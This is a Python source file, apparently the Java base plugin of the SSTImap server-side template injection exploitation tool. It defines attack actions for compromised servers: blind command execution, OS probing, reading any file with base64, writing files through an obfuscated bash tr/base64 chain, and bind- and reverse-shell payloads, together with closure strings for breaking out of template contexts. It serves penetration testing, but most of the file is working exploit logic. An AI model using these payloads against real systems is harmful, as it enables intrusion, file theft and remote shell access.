from core.plugin import Plugin
from core import bash
from utils import closures
from utils import rand
import re


class Java(Plugin):
    # Avoid int overflow
    header_length = 9
    header_type = "add"
    no_tests = True
    priority = 8
    plugin_info = {
        "Description": """Base for Java-based template engines. This plugin performs no tests""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap plugin
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
    }

    def language_init(self):
        self.update_actions({
            # Prepared to used only for blind detection. Not useful for time-boolean
            # tests (since && characters can't be used) but enough for the detection phase.
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            'execute': {
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2],
                'test_os': """uname""",
                'test_os_expected': r'^[\w-]+$'
            },
            'read': {
                'call': 'execute',
                'read': """base64<'{path}'"""
            },
            'write': {
                'call': 'execute',
                'write': """bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}""",
                'truncate': """bash -c {{echo,-n,}}>{path}""",
            },
            'md5': {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'{path}'|head -c 32"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            }
        })

    language = 'java'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var + closures.iterable_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ]
}
